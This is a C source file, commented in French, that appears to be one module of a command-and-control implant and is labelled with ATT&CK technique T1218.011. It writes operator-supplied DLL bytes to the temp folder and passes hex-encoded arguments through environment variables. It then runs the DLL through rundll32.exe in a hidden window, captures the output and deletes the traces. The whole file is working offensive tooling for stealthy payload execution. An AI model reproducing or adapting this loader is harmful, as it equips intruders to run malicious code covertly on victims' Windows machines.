/*
 * ============================================================
 *  rundll32_loader.c - Execution via rundll32.exe (T1218.011)
 * ============================================================
 */
#include "rundll32_loader.h"
#include "platform.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* ============================================================
 *  IMPLEMENTATION WINDOWS UNIQUEMENT
 * ============================================================ */
#ifdef PLATFORM_WINDOWS

#include <windows.h>

#define RUNDLL32_TIMEOUT_MS 30000   /* 30 secondes max */

/* Retourne une structure d'erreur avec message */
static module_result_t make_error(const char *msg) {
    module_result_t r = {0};
    r.status    = -1;
    r.error_msg = _strdup(msg);
    return r;
}

/* ?? Construction du bloc d'environnement enrichi ???????????
 *
 *  GetEnvironmentStringsA() retourne un bloc double-null-termine :
 *    "VAR1=val1\0VAR2=val2\0...\0\0"
 *
 *  On ajoute deux variables supplementaires :
 *    C2_ARGS_HEX    = <args hex-encodes>
 *    C2_OUTPUT_FILE = <chemin fichier sortie>
 *
 *  L'appelant doit free() le pointeur retourne.
 * ???????????????????????????????????????????????????????????? */
static char *build_env_block(const char *args_hex, const char *out_path) {
    char *curr = GetEnvironmentStringsA();
    if (!curr) return NULL;

    /* Calculer la taille du bloc courant (double-null inclus) */
    size_t env_size = 0;
    const char *p = curr;
    while (*p) {
        size_t l = strlen(p) + 1;
        env_size += l;
        p += l;
    }
    env_size++; /* null terminal final */

    /* Construire les deux nouvelles entrees */
    char entry_args[8200];
    char entry_out[MAX_PATH + 84];   /* MAX_PATH+64 (out_path) + 15 ("C2_OUTPUT_FILE=") + marge */
    snprintf(entry_args, sizeof(entry_args), "C2_ARGS_HEX=%s",     args_hex);
    snprintf(entry_out,  sizeof(entry_out),  "C2_OUTPUT_FILE=%s",  out_path);

    size_t ea_len = strlen(entry_args) + 1;
    size_t eo_len = strlen(entry_out)  + 1;
    size_t total  = env_size + ea_len + eo_len;

    char *blk = (char *)malloc(total);
    if (!blk) {
        FreeEnvironmentStringsA(curr);
        return NULL;
    }

    /* Copier l'environnement existant (sans le null terminal final) */
    memcpy(blk, curr, env_size - 1);
    FreeEnvironmentStringsA(curr);

    /* Ajouter les nouvelles variables */
    char *ep = blk + env_size - 1;
    memcpy(ep, entry_args, ea_len); ep += ea_len;
    memcpy(ep, entry_out,  eo_len); ep += eo_len;
    *ep = '\0'; /* double-null terminal */

    return blk;
}

/* ?? Hex-encodage des arguments ?????????????????????????????
 *  Convertit les bytes bruts en chaine hexadecimale lowercase.
 *  "abc" > "616263"
 *  L'appelant doit free() le pointeur retourne.
 * ???????????????????????????????????????????????????????????? */
static char *hex_encode(const unsigned char *data, size_t len) {
    if (len == 0) {
        char *empty = (char *)malloc(1);
        if (empty) *empty = '\0';
        return empty;
    }
    char *out = (char *)malloc(len * 2 + 1);
    if (!out) return NULL;
    for (size_t i = 0; i < len; i++)
        sprintf(out + i * 2, "%02x", data[i]);
    out[len * 2] = '\0';
    return out;
}

/* ============================================================
 *  POINT D'ENTREE PUBLIC
 * ============================================================ */
module_result_t rundll32_loader_execute(
    const unsigned char *dll_bytes, size_t dll_size,
    const unsigned char *args,      size_t args_len
) {
    module_result_t result = {0};

    /* ?? 1. Generer les chemins temporaires uniques ???????????? */
    char temp_dir[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, temp_dir))
        return make_error("[RUNDLL32] GetTempPath echoue");

    DWORD pid  = GetCurrentProcessId();
    DWORD tick = GetTickCount();

    /* MAX_PATH + 64 : temp_dir peut atteindre MAX_PATH, le suffixe fait ~28 chars */
    char dll_path[MAX_PATH + 64];
    char out_path[MAX_PATH + 64];
    snprintf(dll_path, sizeof(dll_path), "%sc2d_%lu%lu.dll",
             temp_dir, (unsigned long)pid, (unsigned long)tick);
    snprintf(out_path, sizeof(out_path), "%sc2o_%lu%lu.bin",
             temp_dir, (unsigned long)pid, (unsigned long)tick);

    printf("[RUNDLL32] DLL temp : %s\n", dll_path);
    printf("[RUNDLL32] Output   : %s\n", out_path);
    fflush(stdout);

    /* ?? 2. Ecrire la DLL sur le disque ??????????????????????? */
    FILE *f = fopen(dll_path, "wb");
    if (!f)
        return make_error("[RUNDLL32] Impossible d'ecrire la DLL temporaire");

    size_t written = fwrite(dll_bytes, 1, dll_size, f);
    fclose(f);

    if (written != dll_size) {
        DeleteFileA(dll_path);
        return make_error("[RUNDLL32] Ecriture DLL incomplete");
    }
    printf("[RUNDLL32] DLL ecrite : %zu bytes\n", dll_size);
    fflush(stdout);

    /* ?? 3. Hex-encoder les arguments ????????????????????????? */
    char *args_hex = hex_encode(args, args_len);
    if (!args_hex) {
        DeleteFileA(dll_path);
        return make_error("[RUNDLL32] Allocation hex_args echouee");
    }

    /* ?? 4. Construire le bloc d'environnement enrichi ???????? */
    char *env_block = build_env_block(args_hex, out_path);
    free(args_hex);

    if (!env_block) {
        DeleteFileA(dll_path);
        return make_error("[RUNDLL32] Construction env block echouee");
    }

    /* ?? 5. Construire la ligne de commande ???????????????????? */
    /*  rundll32.exe "<dll_path>",c2_rundll32_entry               */
    char cmd[MAX_PATH * 2 + 128];
    snprintf(cmd, sizeof(cmd),
             "rundll32.exe \"%s\",c2_rundll32_entry", dll_path);

    printf("[RUNDLL32] CMD : %s\n", cmd);
    fflush(stdout);

    /* ?? 6. Lancer rundll32.exe ???????????????????????????????? */
    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;   /* aucune fenetre visible */

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    BOOL ok = CreateProcessA(
        NULL,          /* chemin : NULL > recherche dans PATH */
        cmd,           /* ligne de commande complete */
        NULL, NULL,    /* security attrs */
        FALSE,         /* bInheritHandles */
        CREATE_NO_WINDOW,  /* aucune console/fenetre */
        env_block,     /* environnement enrichi avec C2_ARGS_HEX + C2_OUTPUT_FILE */
        NULL,          /* repertoire courant : herite du parent */
        &si, &pi
    );

    free(env_block);

    if (!ok) {
        char err[128];
        snprintf(err, sizeof(err),
                 "[RUNDLL32] CreateProcess echoue (err=%lu)", (unsigned long)GetLastError());
        DeleteFileA(dll_path);
        return make_error(err);
    }

    printf("[RUNDLL32] rundll32 PID=%lu - en attente (%dms max)\n",
           (unsigned long)pi.dwProcessId, RUNDLL32_TIMEOUT_MS);
    fflush(stdout);

    /* ?? 7. Attendre la fin du processus ??????????????????????? */
    DWORD wait_result = WaitForSingleObject(pi.hProcess, RUNDLL32_TIMEOUT_MS);

    if (wait_result == WAIT_TIMEOUT) {
        printf("[RUNDLL32] Timeout - TerminateProcess\n");
        fflush(stdout);
        TerminateProcess(pi.hProcess, 1);
    }

    DWORD exit_code = 0;
    GetExitCodeProcess(pi.hProcess, &exit_code);
    printf("[RUNDLL32] rundll32 termine - exit_code=%lu\n",
           (unsigned long)exit_code);
    fflush(stdout);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    /* ?? 8. Lire le fichier de sortie ????????????????????????? */
    FILE *of = fopen(out_path, "rb");
    if (of) {
        fseek(of, 0, SEEK_END);
        long fsz = ftell(of);
        fseek(of, 0, SEEK_SET);

        if (fsz > 0) {
            result.data = (unsigned char *)malloc((size_t)fsz + 1);
            if (result.data) {
                size_t rd = fread(result.data, 1, (size_t)fsz, of);
                result.data[rd]  = '\0';
                result.data_len  = rd;
                result.status    = 0;
            }
        }
        fclose(of);

        printf("[RUNDLL32] Sortie lue : %zu bytes\n",
               result.data ? result.data_len : 0);
        fflush(stdout);
    } else {
        printf("[RUNDLL32] Fichier sortie absent ou vide\n");
        fflush(stdout);
    }

    /* ?? 9. Nettoyer les fichiers temporaires ????????????????? */
    DeleteFileA(dll_path);
    DeleteFileA(out_path);
    printf("[RUNDLL32] Fichiers temporaires supprimes\n");
    fflush(stdout);

    /* ?? 10. Resultat par defaut si sortie vide ??????????????? */
    if (result.status != 0 || !result.data || result.data_len == 0) {
        free(result.data);
        const char *msg = (wait_result == WAIT_TIMEOUT)
            ? "[RUNDLL32] Timeout (30s) - module peut-etre lent"
            : "[RUNDLL32] Execution terminee (aucune sortie capturee)";
        result.data     = (unsigned char *)_strdup(msg);
        result.data_len = result.data ? strlen(msg) : 0;
        result.status   = 0;
    }

    return result;
}

/* ============================================================
 *  STUB LINUX
 * ============================================================ */
#else

module_result_t rundll32_loader_execute(
    const unsigned char *dll_bytes, size_t dll_size,
    const unsigned char *args,      size_t args_len
) {
    (void)dll_bytes; (void)dll_size; (void)args; (void)args_len;
    module_result_t r = {0};
    r.status    = -1;
    r.error_msg = strdup("[RUNDLL32] Technique non supportee sur Linux");
    return r;
}

#endif /* PLATFORM_WINDOWS */
